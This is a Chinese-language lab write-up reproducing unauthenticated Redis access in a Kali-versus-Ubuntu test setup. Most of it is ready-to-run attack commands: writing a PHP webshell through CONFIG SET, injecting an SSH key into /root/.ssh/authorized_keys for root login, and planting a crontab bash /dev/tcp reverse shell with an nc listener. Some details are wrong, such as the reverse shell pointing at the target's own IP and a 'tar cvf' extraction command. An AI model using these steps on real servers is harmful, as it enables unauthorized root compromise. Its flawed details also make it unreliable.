redis未授权访问复现


一、漏洞简介：


1、漏洞简介：

Redis默认情况下，会绑定在0.0.0.0:6379端口,如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。

根据上述简介，总结来说漏洞产生的条件：

1、redis绑定在0.0.0.0:6379端口，并且没有添加防火墙规则避免其他非信任来源 ip 访问，将redis暴露在公网上



2、漏洞危害：

1、其他用户无需密码，直接可以访问redis的内部数据，导致敏感信息泄露

2、可以通过EVAL执行代码写入后门

3、如果redis是以root权限身份运行的，黑客可以给root用户写入SSH公钥文件，直接通过SSH登录服务器。





二、漏洞环境


1、环境介绍

目标靶机: Ubuntu 

目标靶机地址: 192.168.0.136 

攻击靶机: kali 

攻击靶机地址: 192.168.0.142


2、环境搭建

wget http://download.redis.io/releases/redis-2.8.17.tar.gz   #下载安装测试用的Redis


1.tar xzvf redis-2.8.17.tar.gz   #解压安装包

2.cd redis-2.8.17   #进入redis目录 

3.make   #编译


1..cd src/   #进入src目录

2.cp redis-server /usr/bin/ 

3.cp redis-cli /usr/bin/   #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）


1.cd ..   #返回上一级目录 

2.cp redis.conf /etc/   #将redis.conf拷贝到/etc/目录下 

3.redis-server /etc/redis.conf   #使用/etc/目录下的redis.conf文件中的配置启动redis服务

用上述方法，给攻击靶机装一个Redis服务

kali 在解压缩的时候使用的命令为 tar cvf 文件名命令

kali安装完成后的界面

三、漏洞测试

启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了

1. ./redis-cli -h 192.168.0.136   #启动redis-cli程序和靶机进行交互


1、测试使用攻击机无账号登录靶机redis

./redis-cli -h 192.168.0.136 keys *

             

可以看出redis对公网开放，没有启用认证

2、利用redis写入webshell

前提条件：

1、目标靶机redis存在未授权，并且攻击机可以使用redis-cli进行连接（上图已验证）

2、目标靶机开启web服务，并且知道路径（可以通过phpinfo，或者报错误报路径），还要具有增删改查的权限（由于本地搭建，所以知道路径，把webshell文件redis.php写入到 /home/gekyume/ 目录中）

config set dir /home/gekyume/   #设置目录到/home/gekyume/ config set dbfilename redis.php   #设置文件名为redis.php set webshell "<?php phpinfo(); ?>"   #将webshell写入到文件中 save   #保存一下

             

靶机验证一下，webshell已经被写入

             

3、写ssh-keygen公钥登录服务器

前提条件：

1、目标靶机中的Redis服务是使用root账户启动的

2、服务器开放了SSH服务，允许使用密钥登录


1、在目标靶机中创建ssh公钥存放目录

mkdir /root/.ssh   #在root目录中创建一个.ssh文件存放公钥

             

             


2、在攻击机中生成ssh公钥和私钥，密码设为空

ssh-keygen -t rsa   #执行完后一路回车就行

             


3、进入.ssh/目录，将密钥保存为a.txt

cd .ssh/ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > a.txt

             


4、连接目标靶机的redis服务，将保存的ssh公钥a.txt写入到目标靶机的redis服务里

cat a.txt | redis-cli -h 192.168.0.136 -x set crack

             


5、远程登录到目标靶机的redis服务，并使用获取redis备份的路径

redis-cli -h 192.168.0.136   #远程登录到redis服务 CONFIG GET dir   #获取redis备份路径

             


6、更改redis备份路径为ssh公钥存放目录

config set dir /root/.ssh

             


7、设置上传的公钥备份文件名字为authorized_keys

CONFIG SET dbfilename authorized_keys

             


8、检查是否更改成功，有没有authorized_keys文件，没有问题保存退出（到此成功将ssh公钥写入到目标靶机）

CONFIG GET dbfilename save exit

             


9、在攻击机上使用ssh免密登录到目标靶机

ssh -i id_rsa root@192.168.0.136

             

成功登录

4、利用crontab反弹shell

利用条件：

redis服务是以root权限运行的

1、在攻击靶机上开启一个未被占用的端口用来监听

nc -lvnp 4444

             

2、然后执行以下命令，写入反弹shell

redis-cli -h 192.168.0.136   #用redis连接目标靶机 set x "\n* * * * * bash -i >& /dev/tcp/192.168.0.136/4444 0>&1\n"   #写入反弹shell config set dir /var/spool/cron/ config set dbfilename root save
